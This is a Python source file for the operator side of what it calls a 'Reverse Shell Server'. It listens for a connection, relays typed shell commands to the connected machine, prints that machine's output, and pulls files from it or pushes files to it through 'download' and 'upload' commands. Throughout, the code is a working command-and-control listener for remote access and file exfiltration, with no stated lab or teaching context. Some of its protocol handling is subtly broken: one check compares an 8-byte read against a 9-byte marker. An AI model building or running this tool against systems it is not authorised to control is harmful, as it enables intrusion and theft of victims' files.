import socket
import sys
import datetime
import os
import json

# Load configuration from config.json
def load_config():
    try:
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
            log_message("Configuration loaded from config.json")
            return config
    except FileNotFoundError:
        log_message("config.json not found, using default values", "WARNING")
        return None
    except json.JSONDecodeError as e:
        log_message(f"Invalid JSON in config file: {e}", "ERROR")
        return None
    except Exception as e:
        log_message(f"Error loading config: {e}", "ERROR")
        return None

# Simple logging function
def log_message(message, level="INFO"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}\n"
    
    print(log_entry.strip())
    
    try:
        with open("server.log", "a") as log_file:
            log_file.write(log_entry)
    except Exception as e:
        print(f"Warning: Could not write to log file: {e}")

# Display progress bar for file transfers
def show_progress(current, total, filename, action="Transferring"):
    percent = (current / total) * 100
    bar_len = 30
    filled = int(bar_len * current / total)
    bar = '█' * filled + '░' * (bar_len - filled)
    size_mb = total / (1024 * 1024)
    current_mb = current / (1024 * 1024)
    print(f"\r{action}: {filename} [{bar}] {percent:.1f}% ({current_mb:.2f}/{size_mb:.2f} MB)", end='', flush=True)
    if current >= total:
        print()

# Create socket
def create_socket():
    try:
        global host
        global port
        global s
        
        config = load_config()
        if config and "server" in config:
            host = config["server"].get("host", "")
            port = config["server"].get("port", 9999)
        else:
            host = ""
            port = 9999
            
        s = socket.socket()
        log_message(f"Socket created successfully on port {port}")
        return True

    except socket.error as msg:
        log_message(f"Socket creation error: {str(msg)}", "ERROR")
        return False

# Bind socket to port
def bind_socket():
    try:
        global host
        global port
        global s

        log_message(f"Attempting to bind to port {port}...")
        s.bind((host, port))
        s.listen(5)
        log_message(f"Socket bound successfully. Listening for connections...")
        return True

    except socket.error as msg:
        log_message(f"Socket binding error: {str(msg)}", "ERROR")
        log_message("Retrying in 5 seconds...", "WARNING")
        import time
        time.sleep(5)
        bind_socket()
    except Exception as e:
        log_message(f"Unexpected error during binding: {str(e)}", "ERROR")
        return False

# Receive file from client
def receive_file(conn, filename):
    try:
        response = conn.recv(8)
        
        if response == b"FILE_NOT_":
            extra = conn.recv(5)
            log_message(f"File not found on client: {filename}", "ERROR")
            return False
        
        file_size = int.from_bytes(response, 'big')
        log_message(f"Receiving {filename} ({file_size} bytes)...")
        
        save_path = f"received_{filename}"
        bytes_received = 0
        
        with open(save_path, 'wb') as f:
            while bytes_received < file_size:
                chunk = conn.recv(min(4096, file_size - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)
                show_progress(bytes_received, file_size, filename, "Downloading")
        
        log_message(f"File saved: {save_path}")
        return True
        
    except Exception as e:
        log_message(f"Error receiving file: {str(e)}", "ERROR")
        return False

# Send file to client (for upload command)
def send_file(conn, filename):
    try:
        if not os.path.isfile(filename):
            log_message(f"File not found: {filename}", "ERROR")
            return False
        
        file_size = os.path.getsize(filename)
        conn.send(file_size.to_bytes(8, 'big'))
        
        with open(filename, 'rb') as f:
            bytes_sent = 0
            while bytes_sent < file_size:
                chunk = f.read(4096)
                if not chunk:
                    break
                conn.send(chunk)
                bytes_sent += len(chunk)
                show_progress(bytes_sent, file_size, filename, "Uploading")
        
        log_message(f"File uploaded: {filename} ({file_size} bytes)")
        return True
        
    except Exception as e:
        log_message(f"Error sending file: {str(e)}", "ERROR")
        return False

# Establish connection with a client
def socket_accept():
    try:
        log_message("Waiting for incoming connections...")
        conn, address = s.accept()
        log_message(f"Connection established! IP: {address[0]} | Port: {address[1]}")
        
        send_command(conn, address)
        
    except KeyboardInterrupt:
        log_message("Server interrupted by user (Ctrl+C)", "WARNING")
        cleanup()
    except socket.error as e:
        log_message(f"Socket accept error: {str(e)}", "ERROR")
        socket_accept()
    except Exception as e:
        log_message(f"Unexpected error: {str(e)}", "ERROR")
    finally:
        try:
            conn.close()
            log_message("Client connection closed")
        except:
            pass

# Send commands to client
def send_command(conn, address):
    try:
        while True:
            cmd = input()
            
            if cmd == 'quit':
                log_message("Quit command received. Shutting down...", "WARNING")
                conn.close()
                s.close()
                sys.exit()
            
            if len(str.encode(cmd)) > 0:
                if cmd.startswith("download "):
                    filename = cmd.split(" ", 1)[1].strip()
                    conn.send(str.encode(cmd))
                    receive_file(conn, filename)
                    print(os.getcwd() + "> ", end="")
                    continue
                
                if cmd.startswith("upload "):
                    filename = cmd.split(" ", 1)[1].strip()
                    if not os.path.isfile(filename):
                        print(f"File not found: {filename}")
                        print(os.getcwd() + "> ", end="")
                        continue
                    conn.send(str.encode(cmd))
                    send_file(conn, filename)
                    print(os.getcwd() + "> ", end="")
                    continue
                
                try:
                    conn.send(str.encode(cmd))
                    log_message(f"Command sent to {address[0]}: {cmd}")
                    
                    client_response = str(conn.recv(1024), "utf-8")
                    print(client_response, end="")
                    
                except socket.error as e:
                    log_message(f"Error sending/receiving data: {str(e)}", "ERROR")
                    log_message("Client disconnected", "WARNING")
                    break
                except Exception as e:
                    log_message(f"Unexpected error during command execution: {str(e)}", "ERROR")
                    
    except KeyboardInterrupt:
        log_message("Command session interrupted", "WARNING")
    except Exception as e:
        log_message(f"Error in send_command: {str(e)}", "ERROR")

# Cleanup function
def cleanup():
    try:
        s.close()
        log_message("Server socket closed successfully")
    except:
        pass
    sys.exit()

def main():
    log_message("=" * 50)
    log_message("Reverse Shell Server Starting...")
    log_message("=" * 50)
    
    if not create_socket():
        log_message("Failed to create socket. Exiting...", "ERROR")
        sys.exit(1)
    
    if not bind_socket():
        log_message("Failed to bind socket. Exiting...", "ERROR")
        sys.exit(1)
    
    socket_accept()

if __name__ == "__main__":
    main()